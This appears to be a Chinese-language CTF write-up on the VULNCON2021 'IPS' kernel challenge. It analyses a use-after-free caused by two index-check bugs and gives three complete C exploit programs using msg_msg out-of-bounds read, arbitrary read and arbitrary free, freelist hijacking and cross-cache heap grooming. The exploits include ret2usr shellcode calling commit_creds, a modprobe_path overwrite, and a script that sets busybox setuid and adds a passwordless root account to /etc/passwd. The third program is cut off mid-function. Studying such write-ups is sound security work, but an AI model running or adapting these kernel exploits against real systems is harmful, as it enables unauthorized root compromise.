# VULNCON2021 IPS writeup

## 摘要

这篇文章里有：

VULNCON2021 IPS的三种不同解法

msg_msg结构体在kernel exploitation里的OOB read，arbitrary read，arbitrary write，三种原语的用法

freelist劫持实现任意地址写

利用seq_file struct，file struct控制RIP

页级堆风水的构造

ret2usr，modprobe_path两种提权方法

## 漏洞分析

题目实现了自定义的syscall，主要功能有alloc, copy, delete, edit

```c
int copy_storage(int idx) {
  if((idx = check_idx(idx)) < 0) return -1;
  if(chunks[idx] == NULL) return -1;

  int target_idx = get_idx();
  chunks[target_idx] = chunks[idx];//bug1: no check for -1
  return target_idx;
}

int get_idx(void) {
  int i;
  for(i = 0; i < MAX; i++) {
    if(chunks[i] == NULL) {
      return i;
    }
  }
  return -1;
}
```

### 漏洞1

copy里面使用了get_idx获取target_idx， 如果16个chunk都填满了get_idx会返回-1， 但是再copy里并没有对-1做处理， 而是直接`chunks[-1] = chunks[idx]`

### 漏洞2

```c
int edit_storage(int idx, char *data) {
  if((idx = check_idx(idx)) < 0);// bug2: no return
  if(chunks[idx] == NULL) return -1;

  memcpy(chunks[idx]->data, data, strlen(data));

  return 0;
}
```

在edit里虽然检查了idx，但是并没有返回错误，而是继续执行memcpy

### tl;dr

结合以上两个漏洞， 我们可以使用copy在-1的idx上copy一个合法的chunk指针， 使用delete操作原来的idx进行释放，此时-1上的指针并没有被清除， 造成了UAF

总结一下，给了kmalloc-128的UAF， 能edit不能show。

## msg_msg结构体介绍

```c
struct msg_msg {
 	  0x0: void* next; 
 	  0x8: void* prev;
 	  0x10: long m_type;
 	  0x18: size_t m_ts;		/* message text size */
 	  0x20: struct msg_msgseg *next;
 	  0x28: void *security;
 	  0x30: char data[];     /* the actual message follows immediately */
 };
```

这个结构体有0x30的header， data的大小可以由用户决定。

举例来说如果我们想要将这个结构体填到kmalloc-128的洞里，128 = 0x80， 0x80 - 0x30 = 0x50，也就是说只要申请一个0x50的消息即可。如果想要填到小于0x30的坑里， 比如kmalloc-32应该怎么做呢？

由于msg_msg设计最大不超过0x1000字节， 也就是data最大是0x1000-0x30=0xfd0， 如果用户申请的data超过了0xfd0， 超过的部分会用`struct msg_msgseg *next;`指针串起来。

```c
struct msg_msgseg
{
	struct msg_msgseg *next;
	char data[];
};
```

如果我们申请了size=0xfd0+0x18的大小， 内核会先后执行`kmalloc(0xfd0+0x30)` `kmalloc(0x18+0x8)`， 也就达成了申请到小于0x30的SLUB里的目的了。

具体操作如下。

想要申请第一步调用msgget获取qid

```c
int msgqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
```

然后发送消息。

```c
msgsnd(msgqid, msg, size, IPC_NOWAIT);
```

这个msg是一个结构体指针， 指向一个很简单的结构体。

```c
struct msg_t
{
	long m_type;
	char data[];
};
```

也就是第一项是type， 一定要大于0， 后面接着的就是真正的消息数据。

接收消息的操作。

```c
msgrcv(qid, buf, size, type, MSG_NOERROR | IPC_NOWAIT);
```

也是很好理解， 接收qid消息队列里的消息放到buf里。type可以填0默认按顺序接收。

基本就用到这三个函数。

## 结合题目分析

```c
 typedef struct {
 	  0x0: void *next;
 	  0x8: int idx;
 	  0xc: unsigned short priority;
 	  0xe: char data[114];  /* 从第三个字节开始是0x10偏移 */
 } chunk;
```

```c
struct msg_msg {
 	  0x0: void* next; 
 	  0x8: void* prev;
 	  0x10: long m_type;
 	  0x18: size_t m_ts;		/* message text size */
 	  0x20: struct msg_msgseg *next;
 	  0x28: void *security;
 	  0x30: char data[];     /* the actual message follows immediately */
 };
```

题目的struct chunk刚好大小为128字节， 有了UAF我们将这两个结构体重合， 利用edit功能就能篡改msg_msg结构体。edit功能使用strlen判断大小， 也就是说遇到\x00就会截止。

前两个字节会覆盖prev的高两字节， 由于内核地址高两位都是0xffff, 为了避免prev指向非法地址导致kernel panic， 前两字节写成0xffff即可。

后面的内容就会覆盖m_type， m_ts， next， security四个成员。有了这个原语我们能做些什么呢？

## 解法1：freelist劫持

### msg_msg的OOB read原语

通过修改m_ts的值再接收消息

### 计算随机数

将m_ts改的超级大， 然后再接收消息， 即可获得OOB read。freelist和tcache很像， 对指针做了加密

```c
heap_guard = next_free ^ s->random ^ swab(ptr_addr)
```

根据异或的性质我们有

```c
s->random = heap_guard ^ next_free ^ swab(ptr_addr)
```

也就是说只要知道了heap_guard， next_free， ptr_addr就能计算出随机数了， 有了随机数， next_free是我们想要修改的目标地址（modprobe_path）, 再leak出ptr_addr， 就能构造合法的heap_guard劫持freelist了。

|    名字    |                     含义                      |
| :--------: | :-------------------------------------------: |
| heap_guard |                指针的真实数值                 |
| next_free  |                  指向的地址                   |
| s->random  |               系统生成的随机数                |
|  ptr_addr  |                指针自身的地址                 |
|    swab    | 反转字节序函数， 比如0x11223344 -> 0x44332211 |

有了OOB read我们要获取足够的信息用来伪造next指针。怎么做呢？

读取chunk结构体中的next指针我们可以知道某一个chunk的真实地址。目标是获取到两个chunk的真实地址。

先后释放两个已知地址的chunk， A和B。在freelist会有：`B->A`

在进行delete操作时(也就是kfree)，系统会在这个被释放的chunk中间（0x80的大小， freelist的指针在0x40偏移的位置， 刚好在中间）填上heap_guard。这时三个变量heap_guard， next_free， ptr_addr都是已知的。

### 劫持freelist

有了合法的heap_guard， 我们要把他覆盖在一个真正的heap_guard上。从哪里找呢？

我们按顺序做了三个操作：delete A, delete B，msgrcv

msgrcv的操作会触发系统对msg_msg的释放， 也就是说真实的freelist：msg_msg -> B -> A

这个msg_msg就是我们一直在进行UAF操作的那个结构体。在msgrcv结束以后， 我们马上用edit修改其next指针， 就能完成freelist劫持，修改modprobe_path。

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdint.h>
// #include "libexp.h"

#ifndef __NR_IPS
#define __NR_IPS 548
#endif

long kernel_base = 0;
long target_addr = 0;

int fds[0x100];

typedef struct {
  int idx;
  unsigned short priority;
  char *data;
} userdata_t;

void hex_print(void *buf, size_t size, long base) {
	for(size_t i=0; i<size/8; i++) {
		if((i & 0x1) == 0x0) printf("0x%016lx :", base + i*8);
		printf("0x%016lx ", ((long*)buf)[i]);
		if((i & 0x1) == 0x1) printf("\n");
	}
	printf("\n");
}

int alloc(char *data)
{
	userdata_t userdata = {
		.idx = 0,
		.priority = 0,
		.data = data
	};
	assert(strlen(data) < 115);// ???
	int ret = syscall(__NR_IPS, 1, &userdata);
	// assert(ret >= 0);
	return ret;
}

int copy(int idx) {
	userdata_t userdata = {
		.idx = idx,
		.priority = 0,
		.data = 0 
	};
	int ret = syscall(__NR_IPS, 4, &userdata);
	// assert(ret >= 0);
	return ret;
}

void delete(int idx) {
	userdata_t userdata = {
		.idx = idx,
		.priority = 0,
		.data = 0 
	};
	int ret = syscall(__NR_IPS, 2, &userdata);
	// assert(ret == 0);
}

void edit(int idx, char *data) {
	userdata_t userdata = {
		.idx = idx,
		.priority = 0,
		.data = data
	};
	int ret = syscall(__NR_IPS, 3, &userdata);
	// assert(ret == 0);
}

struct chunk_info
{
	unsigned long address;
	unsigned long next;
	unsigned long offset;
};

struct chunk_info chunks[16];

unsigned long bswap(unsigned long val)
{
	return __builtin_bswap64(val);
}

int main()
{

	printf("[+] Prepare modprobe_path exploit\n");

    system("echo -ne '#!/bin/sh\nchmod 4755 /bin/busybox\necho \"hacker::0:0::/root:/bin/sh\" >> /etc/passwd' > /home/user/fuck.sh");
    system("chmod +x /home/user/fuck.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/dummy");
    system("chmod +x /home/user/dummy");

	int msgqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
	assert(msgqid >= 0);

	for(int i=0; i<16; i++) {
		uint64_t mark = 0x4141414141414100 + i;
		char alloc_buf[114];
		memset(alloc_buf, 0x61, sizeof(alloc_buf));
		memcpy(alloc_buf + 2, &mark, 8);
		alloc(alloc_buf);
	}

	copy(0);
	delete(0);

	char payload[0x50];
	memset(payload, 'a', sizeof(payload));
	msgsnd(msgqid, payload, 0x50, IPC_NOWAIT);

	memset(payload, '\xff', sizeof(payload));
	long *ptr = (long *)&payload[2];
	ptr[0] = 0x4141414141414141; // m_type
	ptr[1] = 0x2010; // m_ts
	edit(-1, payload);

	unsigned char leak_buf[0x2010];
	memset(leak_buf, 0, sizeof(leak_buf));

	msgrcv(msgqid, leak_buf, sizeof(leak_buf), 0, MSG_NOERROR | IPC_NOWAIT);

	// hex_print(leak_buf, sizeof(leak_buf)/2, 0);
	// getchar();

	long msg_msg_data_addr = 0;
	long modprobe_path = 0;

	// leak kernel base
	for(int i = 0; i < sizeof(leak_buf)/8; i++) 
	{
		long leak_value = *(long*)(leak_buf + i * 8);
		if((leak_value & 0xfffff) == 0x11600) {
			kernel_base = leak_value - 0xa11600;
			printf("[*] Found kernel base: %#lx\n", kernel_base);
			long kaslr_slide = kernel_base-0xffffffff81000000;
			modprobe_path = kernel_base + 0x144fa20;
			printf("modprobe path: %#lx\n", modprobe_path);
			printf("kaslr slide: %#lx\n", kaslr_slide);
			break;
		}
	}

	for(int i = 0; i < sizeof(leak_buf)/8; i++)
	{
		long* ptr = (long*)(leak_buf + i*8);
		long leak_value = *ptr;
		// if(leak_value)printf("[*] Leak value: %#lx\n", leak_value);
		
		if((leak_value & 0xffffffffffffff00) == 0x4141414141414100) // mark found
		{
			int idx = leak_value & 0xff;
			if(idx < 0 || idx >= 0x10) continue;
			// printf("[*] Found chunk idx: %d\n", idx);
			long* chunk_ptr = ptr - 2; // chunk header is 0x10 bytes before data
			chunks[idx].next = *chunk_ptr;
			chunks[idx].offset = (long)chunk_ptr - (long)leak_buf;
			
		}
	}

	// 0->1->2->3->4->5->6->7->8->9->10->11->12->13->14->15

	for(int i=0; i<15; i++) {
		if(chunks[i].next != 0) {
			chunks[i + 1].address = chunks[i].next;
			msg_msg_data_addr = chunks[i + 1].address - chunks[i + 1].offset - 0x28;	
				
		}
	}

	printf("[*] msg_msg_data_addr: %#lx\n", msg_msg_data_addr);
	// getchar();

	// Show chunk informations
    printf("\nFound chunks\n");
    printf("---------------------------------------------------------------------------------\n");
    for (int i = 0; i < 16; i++)
    {
		printf("Chunk [%2d] - Address: %18p / Next: %18p / Offset: %5p\n", i, (void *)chunks[i].address, (void *)chunks[i].next, (void *)chunks[i].offset);
    }
    printf("---------------------------------------------------------------------------------\n\n");


	msgqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
	memset(payload, 'b', sizeof(payload));
	msgsnd(msgqid, payload, 0x50, IPC_NOWAIT);
	memset(payload, '\xff', sizeof(payload));
	ptr = (long *)&payload[2];
	ptr[0] = 0x4141414141414141; // m_type
	ptr[1] = 0x2010; // m_ts

	edit(-1, payload);


	// Free two chunks with known offset and address
	int freed_count = 0;
	int freed_index[2];
	for(int i=0; i<16; i++) {
		if(chunks[i].address != 0 && chunks[i].offset != 0) {
			delete(i);
			printf("[*] Freed chunk idx: %d\n", i);
			freed_index[freed_count++] = i;
			if(freed_count == 2) break;
		}
	}

	if (freed_count != 2)
	{
		printf("[+] Didn't find enough chunks for heap guard leak\n");
		exit(-1);
	}

	msgrcv(msgqid, leak_buf, sizeof(leak_buf), 0, MSG_NOERROR | IPC_NOWAIT);

	printf("[*] free list: msg_msg -> %d -> %d\n", freed_index[1], freed_index[0]);

	// hex_print(leak_buf, sizeof(leak_buf), msg_msg_data_addr)

    // next_free = heap_guard ^ s->random ^ swab(ptr_addr)
    // s->random = heap_guard ^ next_free ^ swab(ptr_addr)

	long heap_guard = *(long*)(leak_buf + chunks[freed_index[1]].offset + 0x40);
	printf("[*] heap_guard: %#lx\n", heap_guard);
	long next_free = chunks[freed_index[0]].address;
	printf("[*] next_free: %#lx\n", next_free);
	long ptr_addr = chunks[freed_index[1]].address + 0x40;
	printf("[*] ptr_addr: %#lx\n", ptr_addr);

	long slab_random = heap_guard ^ next_free ^ bswap(ptr_addr);
	printf("[*] slab_random: %#lx\n", slab_random);


	char buf[114];
	memset(buf, 0, sizeof(buf));
	memset(buf, 0x45, 0x32);
	ptr = (long *)(buf + 0x32);

	*ptr = (modprobe_path - 0x10) ^ slab_random ^ bswap(msg_msg_data_addr + 0x40);
	// hex_print(buf, sizeof(buf), 0);
	
	// memset(buf+0x32+8, 0, 1);

	// printf("[*] Crafted payload for edit:\n");
	// getchar();
	edit(-1, buf);
	// printf("[*] Payload edited, now allocate two chunks to trigger modprobe_path overwrite\n");
	// getchar();
	

	memset(buf, 0, sizeof(buf));
	memset(buf, 0x41, 0x2);
	strcpy(buf + 0x2, "/home/user/fuck.sh");

	alloc(buf);
	alloc(buf);

	system("cat /proc/sys/kernel/modprobe");
    printf("Trigger modprobe_path exploit\n");
    system("/home/user/dummy");
    system("su hacker");

    return 0;
    
}
```

## 解法2：cross cache leak + arbitrary free(write)

题目的chunk结构体位于kmalloc-128，喷射的file结构体位于kmalloc-256。通过喷射大量0x80的slab有几率使得处于kmalloc-128的目标chunk和有file结构体的kmalloc-256的页面相邻， 通过OOB read leak相邻页面的数据获取file结构体的地址和kernelbase。

下一步是覆写file结构体的`struct file_operations *f_op`成员控RIP。题目给的run.sh

```sh
qemu-system-x86_64 \
  -m 256M \
  -initrd initramfs.cpio.gz \
  -kernel ./bzImage -nographic \
  -monitor /dev/null \
  -s \
  -append "kpti=1 +smep +smap kaslr root=/dev/ram rw console=ttyS0 oops=panic paneic=1 quiet"
```

虽然开启了smep和smap， 但由于没有指定cpu类型， qemu默认的cpu不支持smep和smap所以可以打ret2usr

### msg_msg的arbitrary free原语

```c
void free_msg(struct msg_msg *msg)
{
	struct msg_msgseg *seg;

	security_msg_msg_free(msg);

	seg = msg->next;
	kfree(msg);
	while (seg != NULL) {
		struct msg_msgseg *tmp = seg->next;

		cond_resched();
		kfree(seg);
		seg = tmp;
	}
}
```

在msgrcv结束以后会触发free_msg，会检查seg = msg->next;如果seg存在则会kfree(seg); 也就是说通过伪造next指针， 然后msgrcv即可任意地址释放。释放的地址会加入哪个大小cache的freelist取决于该地址的页面。由于我们构造了kmalloc-128和kmalloc-256页面相邻， 我们在kmalloc-128页面的末尾free，这个地址会加入到kmalloc-128的freelist中， 再用msg_msg取回来， 就能覆盖到相邻的kmalloc-256页面中的file结构体了。

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <stdint.h>
#include <signal.h>
// #include "libexp.h"

#ifndef __NR_IPS
#define __NR_IPS 548
#endif

long kernel_base = 0;
long target_addr = 0;
long prepare_kernel_cred = 0xffffffff8108aad0;
long commit_creds = 0xffffffff8108a830;
int fds[0x100];

void hex_print(void *addr, size_t len)
{
	uint64_t tmp_addr = (uint64_t)addr;
	puts("");
	for(uint64_t tmp_addr=(uint64_t)addr; tmp_addr < (uint64_t)addr + len; tmp_addr += 0x10) {
		printf("0x%016llx: 0x%016llx 0x%016llx\n", tmp_addr, *(uint64_t *)tmp_addr, *(uint64_t *)(tmp_addr+8));
	}
}

typedef struct {
  int idx;
  unsigned short priority;
  char *data;
} userdata_t;

int alloc(char *data)
{
	userdata_t userdata = {
		.idx = 0,
		.priority = 0,
		.data = data
	};
	assert(strlen(data) < 115);// ???
	int ret = syscall(__NR_IPS, 1, &userdata);
	assert(ret >= 0);
	return ret;
}

int copy(int idx) {
	userdata_t userdata = {
		.idx = idx,
		.priority = 0,
		.data = 0 
	};
	int ret = syscall(__NR_IPS, 4, &userdata);
	// assert(ret >= 0);
	return ret;
}

void delete(int idx) {
	userdata_t userdata = {
		.idx = idx,
		.priority = 0,
		.data = 0 
	};
	int ret = syscall(__NR_IPS, 2, &userdata);
	assert(ret == 0);
}

void edit(int idx, char *data) {
	userdata_t userdata = {
		.idx = idx,
		.priority = 0,
		.data = data
	};
	int ret = syscall(__NR_IPS, 3, &userdata);
	assert(ret == 0);
}

void msg_spray(void *payload, size_t len, int count)
{
	int msgqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
	assert(msgqid >= 0);

	for(int i=0; i<count; i++) {
		msgsnd(msgqid, payload, len, IPC_NOWAIT);
	}
}

void defragment()
{
	int qid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
	char buf[0x50];
	memset(buf, '\x77', sizeof(buf));
	for(int i=0; i<0x500; i++) {
		msgsnd(qid, buf, sizeof(buf), IPC_NOWAIT);
	}
}

unsigned long long user_ss, user_sp, user_rflags, user_rip, user_cs;

void get_shell()
{
    printf("uid: %d\n", getuid());
    system("/bin/sh");
}

void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        // ".att_syntax;"
    );
    puts("[*] Saved state");
}

void shellcode(void)
{
    __asm__(
        ".intel_syntax noprefix;"
        // privilege escalation operations
        "movabs rax, prepare_kernel_cred;" //prepare_kernel_cred
        "xor rdi, rdi;"
        "call rax; mov rdi, rax;"
        "movabs rax, commit_creds;" //commit_creds
        "call rax;"

        // return back to user safely
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        // ".att_syntax;"
    );
}

void *umem_alloc(void *addr, size_t size)
{
	void *ret;
	int flags = MAP_SHARED | MAP_ANON;
	if (addr) flags |= MAP_FIXED;
	ret = mmap(addr, size, PROT_READ | PROT_WRITE | PROT_EXEC, flags, -1, 0);
	if(addr && ret != addr) printf("[-] umem_alloc fails to mmap the fixed address %p", addr);
	if(!addr && !ret) printf("[-] umem_alloc fails to mmap NULL");
	return ret;
}


int main()
{
	signal(SIGSEGV, get_shell);
	printf("shellcode: %p\n", shellcode);
	user_rip = get_shell;
	save_state();
	
	/*leak*/

	int msgqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
	assert(msgqid >= 0);

	// prepare heap layout
	defragment();

	alloc("zmjjrr");
	// spray targets
	for(int i=0; i<sizeof(fds)/sizeof(fds[0]); i++) {
		// fds[i] = open("/dev/null", 0);
		fds[i] = open("/etc/passwd", 0);
	}

	for(int i=0; i<16; i++) {
		copy(0);
	}

	char payload[0x50];
	memset(payload, 0x43, sizeof(payload));

	// trigger UAF
	delete(0);

	msgsnd(msgqid, payload, 0x50, IPC_NOWAIT);

	memset(payload, '\xff', sizeof(payload));
	long *ptr = (long *)&payload[2];
	ptr[0] = 0x4141414141414141;
	ptr[1] = 0x2010;
	edit(-1, payload);


	long leak_buf[0x2010/8];
	memset(leak_buf, 0, sizeof(leak_buf));

	msgrcv(msgqid, leak_buf, sizeof(leak_buf), 0, MSG_NOERROR | IPC_NOWAIT);
	// hex_print(leak_buf, sizeof(leak_buf));

	// getchar();

	// leak
	long base = 0;
	for(int i=0; i<sizeof(leak_buf)/8; i++) {
		long leak_ptr = leak_buf[i];
		if((leak_ptr & 0xfffff) == 0x29500) {
			kernel_base = leak_ptr - 0x1029500;
			target_addr = leak_buf[i+6] - 0x58 - 0x10;
			if((target_addr & 0xf00) == 0xf00) break;
		}
	}


	long kaslr_slide = kernel_base-0xffffffff81000000;
	printf("kernel_base: %#lx\n", kernel_base);
	printf("kaslr slide: %#lx\n", kaslr_slide);
	prepare_kernel_cred += kaslr_slide;
	commit_creds += kaslr_slide;
	assert(kernel_base != 0);
	printf("target_addr: %#lx\n", target_addr);

	/*attack*/
	// getchar();
	int msgqid2 = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
	assert(msgqid2 >= 0);
	memset(payload, 'A', sizeof(payload));
	msgsnd(msgqid2, payload, 0x50, IPC_NOWAIT);

	memset(payload, '\x00', sizeof(payload));
	payload[0] = '\xff';
	payload[1] = '\xff';
	ptr = (long *)&payload[2];
	ptr[0] = 0x4141414141414141;
	ptr[1] = 0x4242424242424242;
	ptr[2] = target_addr;
	edit(-1, payload);

	memset(leak_buf, 0, sizeof(leak_buf));

	// // getchar();
	msgrcv(msgqid2, leak_buf, sizeof(leak_buf), 0, MSG_NOERROR | IPC_NOWAIT);

	// hex_print(leak_buf, sizeof(leak_buf));
	memset(payload, 'B', sizeof(payload));
	long *fake_op = umem_alloc(0x700000, 0x1000);
	ptr = (long*)payload;
	printf("fake_op: %p\n", fake_op);
	// for(int i=0;i<10;i++){
	// 	ptr[i] = 0x4142434445464700 + i;
	// }
	ptr[2] = (long)fake_op;
	// payload[2] = (long)fake_op;
	// memset(fake_op, 'A', 0x80);
	fake_op[0x78/8] = shellcode;
	msg_spray(payload, 0x50, 0x100);

	// for(int i=0; i<sizeof(fds)/sizeof(fds[0]); i++) lseek(fds[i], 0, SEEK_SET);
	for(int i=0; i<sizeof(fds)/sizeof(fds[0]); i++) close(fds[i]);

	puts("after trigger");

	getchar();
}
```

## 解法3：arbitrary read + arbitrary free(write)

### msg_msg的arbitrary read原语

做法和arbitrary free原语相同， 通过伪造指向msg_msgseg的next指针指向想要读取的地址， 在msgrcv的时候接收即可。不同在于这里要注意next指针指向的地址的值， 即为伪造的msg_msgseg的第一个成员next要是0， 如果是非法的地址值的话会在尝试kfree的时候panic。

### seq_file struct

这是一个0x20的结构体， 位于kmalloc-32

```c
 struct seq_operations {
     void * (*start) (struct seq_file *m, loff_t *pos);
     void (*stop) (struct seq_file *m, void *v);
     void * (*next) (struct seq_file *m, void *v, loff_t *pos);
     int (*show) (struct seq_file *m, void *v);
 };
```

使用`open("/proc/self/stat", O_RDONLY);`喷射该结构体， 使用`read(fds, buf, size);`触发start函数指针， 所以我们只需要修改start指针即可控制RIP。

这次不需要构造page level的堆风水，而是要在一个消息队列里构造`kmalloc-128 -> kmalloc-4096 -> kmalloc-32`这样的链子，通过msg_msg头部的next指针可以很容易的读取kmalloc-32页面的地址， 然后再利用arbitrary write覆写seqfile结构体的start指针。申请到kmalloc-32的msg可以利用上文msg_msg结构体介绍里的技巧。

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <signal.h>
#include <stdint.h>
// #include "libexp.h"

#ifndef __NR_IPS
#define __NR_IPS 548
#endif

long kernel_base = 0;
long target_addr = 0;

long prepare_kernel_cred = 0xffffffff8108aad0;
long commit_creds = 0xffffffff8108a830;

int fds[0x100];

typedef struct {
  int idx;
  unsigned short priority;
  char *data;
} userdata_t;

void hex_print(void *buf, size_t size, long base) {
	for(size_t i=0; i<size/8; i++) {
		if((i & 0x1) == 0x0) printf("0x%016lx :", base + i*8);
		printf("0x%016lx ", ((long*)buf)[i]);
		if((i & 0x1) == 0x1) printf("\n");
	}
	printf("\n");
}

int alloc(char *data)
{
	userdata_t userdata = {
		.idx = 0,
		.priority = 0,
		.data = data
	};
	assert(strlen(data) < 115);// ???
	int ret = syscall(__NR_IPS, 1, &userdata);
	// assert(ret >= 0);
	return ret;
}

int copy(int idx) {
	userdata_t userdata = {
		.idx = idx,
		.priority = 0,
		.data = 0 
	};
	int ret = syscall(__NR_IPS, 4, &userdata);
	// assert(ret >= 0);
	return ret;
}

void delete(int idx) {
	userdata_t userdata = {
		.idx = idx,
		.priority = 0,
		.data = 0 
	};
	int ret = syscall(__NR_IPS, 2, &userdata);
	// assert(ret == 0);
}

void edit(int idx, char *data) {
	userdata_t userdata = {
		.idx = idx,
		.priority = 0,
		.data = data
	};
	int ret = syscall(__NR_IPS, 3, &userdata);
	// assert(ret == 0);
}

struct chunk_info
{
	unsigned long address;
	unsigned long next;
	unsigned long offset;
};

struct chunk_info chunks[16];

struct msgQueueMsg {
    long mtype;
    char mtext[0x2000];
};

int msgQueueCreate(void) {
    int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    assert(qid >= 0);
    return qid;
}

void msgQueueSend(int qid, const void *msg, size_t size, long type) {
    struct msgQueueMsg *buf = calloc(1, sizeof(long) + size);
    assert(buf != NULL);
    buf->mtype = type;
    memcpy(buf->mtext, msg, size);
    assert(msgsnd(qid, buf, size, IPC_NOWAIT) != -1);
    free(buf);
}

struct msgQueueMsg* msgQueueRecv(int qid, size_t size, long type) {
    struct msgQueueMsg *buf = calloc(1, sizeof(long) + size);
    assert(buf!= NULL);

    assert(msgrcv(qid, buf, size, type, MSG_NOERROR | IPC_NOWAIT) != -1);
    return buf;
}

void get_shell()
{
    printf("uid: %d\n", getuid());
    system("/bin/sh");
}

void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        // ".att_syntax;"
    );
    puts("[*] Saved state");
}

void shellcode(void)
{
    __asm__(
        ".intel_syntax noprefix;"
        // privilege escalation operations
        "movabs rax, prepare_kernel_cred;" //prepare_kernel_cred
        "xor rdi, rdi;"
        "call rax; mov rdi, rax;"
        "movabs rax, commit_creds;" //commit_creds
        "call rax;"

        // return back to user safely
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        // ".att_syntax;"
    );
}

unsigned long long user_ss, user_sp, user_rflags, user_rip, user_cs;

int main()
{

	signal(SIGSEGV, get_shell);
	printf("shellcode: %p\n", shellcode);
	user_rip = get_shell;
	save_state();

	int msgqid1 = msgQueueCreate();
	assert(msgqid1 >= 0);

	// spray seq_file
	int fds[0x40] = {0};
    for(int i = 0 ; i < 0x40; i++){
        fds[i] = open("/proc/self/stat", O_RDONLY);
    }

	alloc("zmjjrr");

	for(int i=0; i<16; i++) {
		copy(0);
	}

	delete(0);

	char payload[0x50];
	memset(payload, 'a', sizeof(payload));
	msgQueueSend(msgqid1, payload, 0x50, 0x1234);

	char* buf = calloc(1, 0x2000);
	// memset(buf, '\x77', 0x2000);

	// spray msg_msg chain : kmalloc-128 -> kmalloc-4096 -> kmalloc-32
	for(int i = 0; i < 16; i++) {
		char mark[0x50] = {0};
		memset(mark, '\x99', 8);
		int tempqid = msgQueueCreate();
		msgQueueSend(tempqid, mark, 0x50, i+1);
		msgQueueSend(tempqid, buf, 0xfd0 + 0x18, i+1);
	}

	memset(payload, '\xff', sizeof(payload));
	long *ptr = (long *)&payload[2];
	ptr[0] = 0x4141414141414141; // m_type
	ptr[1] = 0xfff; // m_ts
	edit(-1, payload);

	int msgqid2 = msgQueueCreate();
	memset(payload, 0, sizeof(payload));


	unsigned char* leak_buf = msgQueueRecv(msgqid1, 0x1000, 0)->mtext;

	// immdiate refill
	msgQueueSend(msgqid2, payload, 0x50, 0x1234);
	// hex_print(leak_buf, 0x1000, 0);

	long leak1 = 0;

	for(int i = 0; i < 0x1000/8; i++) {
		long* ptr = &((long*)leak_buf)[i];
		if(*ptr == 0x9999999999999999) {
			leak1 = *(ptr - 6);
			printf("[+] Leaked Next Pointer Base: 0x%lx\n", leak1);
			break;
		}

	}
	free(leak_buf-8);

	assert(leak1 != 0);

	memset(payload, 0, sizeof(payload));
	memset(payload, '\xff', 2);
	ptr = (long *)&payload[2];
	ptr[0] = 0x4141414141414141; // m_type
	ptr[1] = 0x3131313131313131; // m_ts
	ptr[2] = leak1-0x10;
	edit(-1, payload);


	int msgqid3 = msgQueueCreate();
	memset(payload, 0, sizeof(payload));

	leak_buf = msgQueueRecv(msgqid2, 0x1000, 0)->mtext;
	// hex_print(leak_buf, 0x1000, 0);

	//immediate refill
	msgQueueSend(msgqid3, payload, 0x50, 0x1234);

	long leak2 = *(long*)(&leak_buf[0xff8]);
	
	printf("[+] kmalloc-32 heap address: 0x%lx\n", leak2);
	// getchar();
	free(leak_buf-8);
	assert(leak2 != 0);

	memset(payload, 0, sizeof(payload));
	memset(payload, '\xff', 2);
	ptr = (long *)&payload[2];
	ptr[0] = 0x4141414141414141; // m_type
	ptr[1] = 0x3131313131313131; // m_ts
	ptr[2] = leak2;
	edit(-1, payload);

	int msgqid4 = msgQueueCreate();
	memset(payload, 0x61, sizeof(payload));

	leak_buf = msgQueueRecv(msgqid3, 0x2000, 0)->mtext;
	// hex_print(leak_buf, 0x2000, 0);

	//immediate refill
	msgQueueSend(msgqid4, payload, 0x50, 0x1234);


	long kernel_base = 0;
	long kaslr_slide = 0;
	long seq_op_start = 0;
	long real_seq_op_addr = 0;

	for(int i = 0; i < 0x2000/8; i++) {
		long* ptr = &((long*)leak_buf)[i];
		if((*ptr & 0xfff) == 0xfd0 && (*ptr & 0xffffffff00000000) == 0xffffffff00000000) {
			seq_op_start = *ptr;
			printf("[+] offset: 0x%lx\n", (long)ptr - (long)leak_buf);
			printf("[+] seq_file operations function pointer [start] value: 0x%lx\n", seq_op_start);
			real_seq_op_addr = leak2 + ((long)ptr - (long)leak_buf - 0xfc8);
			printf("[+] seq_file operations function pointer [start] address: 0x%lx\n", real_seq_op_addr);


			kernel_base = seq_op_start - 0x20efd0;
			break;
		}
	}

	assert(seq_op_start != 0);
	assert(kernel_base != 0);
	printf("[+] kernel base: 0x%lx\n", kernel_base);
	kaslr_slide = kernel_base - 0xffffffff81000000;
	printf("[+] KASLR slide: 0x%lx\n", kaslr_slide);
	prepare_kernel_cred += kaslr_slide;
	commit_creds += kaslr_slide;

	free(leak_buf-8);
